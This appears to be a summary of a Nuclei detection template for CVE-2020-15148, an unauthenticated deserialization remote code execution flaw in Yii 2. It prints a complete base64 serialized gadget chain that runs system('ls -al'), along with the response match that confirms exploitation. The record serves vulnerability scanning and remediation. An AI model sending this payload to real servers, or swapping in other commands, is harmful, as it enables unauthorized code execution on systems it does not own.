---
cve_id: CVE-2020-15148
template_path: nuclei-templates/http/cves/2020/CVE-2020-15148.yaml
affected_product: Yii 2
severity: critical
authentication: none
external_callback: false
affected_versions: < 2.0.38
preconditions: application calls `unserialize()` on arbitrary user input
poc_classification: rce
---

## Vulnerability
Yii 2 (yiisoft/yii2) < 2.0.38 is vulnerable to remote code execution due to calling `unserialize()` on arbitrary user input, enabling PHP object injection (CWE-502).  
CVSS: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).  
Impact: arbitrary code execution on the server.  
Remediation: upgrade to 2.0.38 or later; see advisory for workarounds.

## PoC / Detection
Classification: rce

The template issues a single unauthenticated GET request to `{{BaseURL}}/index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==` (serialized gadget chain triggering `system("ls -al")` via `BatchQueryResult` → `Faker\Generator` → `yii\rest\CreateAction`). It matches on presence of both "total" (ls output) AND "An internal server error occurred." together with HTTP 500 to confirm successful exploitation.

## References
- https://blog.csdn.net/xuandao_ahfengren/article/details/111259943
- https://github.com/nosafer/nosafer.github.io/blob/227a05f5eff69d32a027f15d6106c6d735124659/docs/Web%E5%AE%89%E5%85%A8/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md
- https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99
- https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj
- https://github.com/20142995/sectool
